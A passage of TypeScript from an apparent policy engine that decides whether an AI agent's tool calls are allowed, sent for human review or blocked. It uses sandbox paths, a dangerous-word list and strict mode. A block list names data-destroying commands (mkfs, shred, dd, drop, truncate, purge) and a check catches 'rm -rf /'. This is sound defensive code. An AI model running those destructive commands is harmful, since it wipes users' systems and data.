    allTokens = tokenize(toolName);

    // Deep scan: if this tool isn't in toolInspection, scan all arg values for dangerous words
    if (args && typeof args === 'object') {
      const flattenedArgs = JSON.stringify(args).toLowerCase();
      const extraTokens = flattenedArgs.split(/[^a-zA-Z0-9]+/).filter((t) => t.length > 1);
      allTokens.push(...extraTokens);
    }
  }

  // ── 4. CONTEXTUAL RISK DOWNGRADE ────────────────────────────────────────
  // If the human is typing manually, we only block "Total System Disaster" actions.
  const isManual = agent === 'Terminal';
  if (isManual) {
    const SYSTEM_DISASTER_COMMANDS = ['mkfs', 'shred', 'dd', 'drop', 'truncate', 'purge'];

    const hasSystemDisaster = allTokens.some((t) =>
      SYSTEM_DISASTER_COMMANDS.includes(t.toLowerCase())
    );

    // Catch the most famous disaster: rm -rf /
    const isRootWipe =
      allTokens.includes('rm') && (allTokens.includes('/') || allTokens.includes('/*'));

    if (hasSystemDisaster || isRootWipe) {
      // If it IS a system disaster, return review so the dev gets a
      // "Manual Nuclear Protection" popup as a final safety check.
      return { decision: 'review', blockedByLabel: 'Manual Nuclear Protection', tier: 3 };
    }

    // For everything else (docker, psql, rmdir, delete, rm),
    // we trust the human and auto-allow.
    return { decision: 'allow' };
  }

  // ── 5. Sandbox Check (Safe Zones) ───────────────────────────────────────
  if (pathTokens.length > 0 && config.policy.sandboxPaths.length > 0) {
    const allInSandbox = pathTokens.every((p) => matchesPattern(p, config.policy.sandboxPaths));
    if (allInSandbox) return { decision: 'allow' };
  }

  // ── 6. Dangerous Words Evaluation ───────────────────────────────────────
  let matchedDangerousWord: string | undefined;
  const isDangerous = allTokens.some((token) =>
    config.policy.dangerousWords.some((word) => {
      const w = word.toLowerCase();
      const hit =
        token === w ||
        (() => {
          try {
            return new RegExp(`\\b${w}\\b`, 'i').test(token);
          } catch {
            return false;
          }
        })();
      if (hit && !matchedDangerousWord) matchedDangerousWord = word;
      return hit;
    })
  );

  if (isDangerous) {
    // Find which specific field contained the dangerous word for the UI
    let matchedField: string | undefined;
    if (matchedDangerousWord && args && typeof args === 'object' && !Array.isArray(args)) {
      const obj = args as Record<string, unknown>;
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === 'string') {
          try {
            if (
              new RegExp(
                `\\b${matchedDangerousWord.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`,
                'i'
              ).test(value)
            ) {
              matchedField = key;
              break;
            }
          } catch {
            /* ignore */
          }
        }
      }
    }
    return {
      decision: 'review',
      blockedByLabel: `Project/Global Config — dangerous word: "${matchedDangerousWord}"`,
      matchedWord: matchedDangerousWord,
      matchedField,
      ruleDescription: `This command contains a flagged keyword ("${matchedDangerousWord}") from your node9 config. Review it before allowing.`,
      tier: 6,
    };
  }

  // ── 7. Strict Mode Fallback ─────────────────────────────────────────────
  if (config.settings.mode === 'strict') {
    if (activeEnvironment?.requireApproval === false) return { decision: 'allow' };
    return { decision: 'review', blockedByLabel: 'Global Config (Strict Mode Active)', tier: 7 };
  }

  return { decision: 'allow' };
}

/** Returns true when toolName matches the config's ignoredTools list. */
export function isIgnoredTool(toolName: string, config: PolicyConfig): boolean {
  return matchesPattern(toolName, config.policy.ignoredTools);
}
